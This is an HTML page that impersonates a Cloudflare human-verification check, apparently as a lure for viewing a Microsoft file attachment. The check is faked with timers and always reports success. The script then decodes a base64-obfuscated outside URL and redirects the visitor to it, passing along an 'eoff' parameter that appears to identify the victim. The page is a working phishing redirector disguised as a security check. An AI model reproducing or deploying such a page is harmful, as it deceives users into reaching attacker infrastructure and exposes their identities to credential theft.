<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS FILES</title>
    <style>
        :root {
            --primary-blue: #4a6ee0;
            --success-green: #28a745;
            --light-bg: #f8f9fa;
            --transition-speed: 450ms cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow: hidden;
        }

        /* Loading Overlay */
        #preloader {
            position: fixed;
            inset: 0;
            background: var(--light-bg);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 100;
            transition: opacity var(--transition-speed);
        }

        .loader-logo {
            width: 120px;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.08); opacity: 1; }
        }

        /* Main Content */
        .app-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            width: 100%;
            max-width: 440px;
            padding: 20px;
            opacity: 0;
            transform: translateY(10px);
            transition: opacity 600ms ease-out, transform 600ms ease-out;
        }

        .app-container.is-visible {
            opacity: 1;
            transform: translateY(0);
        }

        .instruction-text {
            text-align: center;
            font-size: 1.1rem;
            font-weight: 500;
            margin-bottom: 24px;
            line-height: 1.4;
            color: #333;
        }

        .verification-card {
            background: var(--light-bg);
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 30px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .checkbox-section {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .custom-checkbox {
            width: 22px;
            height: 22px;
            border: 2px solid var(--primary-blue);
            border-radius: 4px;
            background: #fff;
            cursor: pointer;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.25s ease;
        }

        .custom-checkbox.loading {
            border-radius: 50%;
            border-color: #eee;
            border-top-color: var(--primary-blue);
            animation: spin 1s linear infinite;
        }

        .custom-checkbox.checked {
            background: var(--success-green);
            border-color: var(--success-green);
        }

        .custom-checkbox.checked::after {
            content: "\2713";
            color: #fff;
            font-size: 14px;
            font-weight: bold;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .brand-info {
            text-align: right;
            font-size: 11px;
            color: #777;
        }

        .brand-info img {
            width: 28px;
            vertical-align: middle;
            margin-right: 5px;
        }

        .brand-info b {
            color: #f38020;
            letter-spacing: 0.5px;
        }

        .status-message {
            text-align: center;
            margin-top: 25px;
            font-size: 12px;
            height: 14px;
            opacity: 0;
            transition: opacity 0.5s;
        }

        /* Footer */
        .footer-banner {
            padding: 30px;
            color: #999;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            opacity: 0;
            transition: opacity 0.5s;
        }

        .footer-banner.is-visible { opacity: 1; }

        .shield-icon {
            width: 12px;
            height: 14px;
            background: #999;
            clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%);
        }
    </style>
</head>
<body>

    <div id="preloader">
        <img src="astro.png" alt="Loading" class="loader-logo">
    </div>

    <main class="app-container" id="mainWrapper">
        <h1 class="instruction-text">Verify you are human by completing the action below to view attachment</h1>

        <div class="verification-card">
            <div class="checkbox-section">
                <div id="actionBox" class="custom-checkbox"></div>
                <span id="actionText" style="font-weight: 500; font-size: 16px;">Verify</span>
            </div>

            <div class="brand-info">
                <div><img src="cloudflare_.png" alt=""><b>CLOUDFLARE</b></div>
                <span>Privacy &middot; Terms</span>
            </div>
        </div>

        <div id="notificationArea" class="status-message"></div>
    </main>

    <footer class="footer-banner" id="footerInfo">
        <div class="shield-icon"></div>
        <span>Protected by CLOUDFLARE</span>
    </footer>

    <script>
        (function() {
            "use strict";

            // Configuration
            const CONFIG = {
                endpoint: "aHR0cHM6Ly9wby50aWZmbnVhZS5vbmxpbmUvYXBpL3YxL3RnS0hmMHIwRVdxSWFDYjU=",
                delays: {
                    initial: 1500,
                    verify: 1800,
                    redirect: 2000
                }
            };

            // DOM Elements
            const elements = {
                loader: document.getElementById('preloader'),
                main: document.getElementById('mainWrapper'),
                box: document.getElementById('actionBox'),
                label: document.getElementById('actionText'),
                footer: document.getElementById('footerInfo'),
                status: document.getElementById('notificationArea')
            };

            let isProcessing = false;

            /**
             * Handles page entry animations
             */
            const initApp = () => {
                window.addEventListener('load', () => {
                    setTimeout(() => {
                        elements.loader.style.opacity = '0';

                        setTimeout(() => {
                            elements.loader.style.display = 'none';
                            elements.main.classList.add('is-visible');
                            elements.footer.classList.add('is-visible');
                        }, 500);
                    }, CONFIG.delays.initial);
                });
            };

            /**
             * Handles the verification click logic
             */
            const handleVerification = async () => {
                if (isProcessing) return;
                isProcessing = true;

                // Update UI to loading state
                elements.label.textContent = "Verifying...";
                elements.box.classList.add('loading');

                // Simulate network/verification delay
                await new Promise(resolve => setTimeout(resolve, CONFIG.delays.verify));

                // Update UI to success state
                elements.box.classList.remove('loading');
                elements.box.classList.add('checked');
                elements.label.textContent = "Success";
                elements.status.style.opacity = '1';

                // Final redirect
                setTimeout(() => {
                    const params = new URLSearchParams(window.location.search);
                    const eoff = params.get('eoff');
                    const destination = atob(CONFIG.endpoint);

                    window.location.href = eoff ? `${destination}#${eoff}` : destination;
                }, CONFIG.delays.redirect);
            };

            // Event Listeners
            elements.box.addEventListener('click', handleVerification);

            // Startup
            initApp();
        })();
    </script>
</body>
</html>
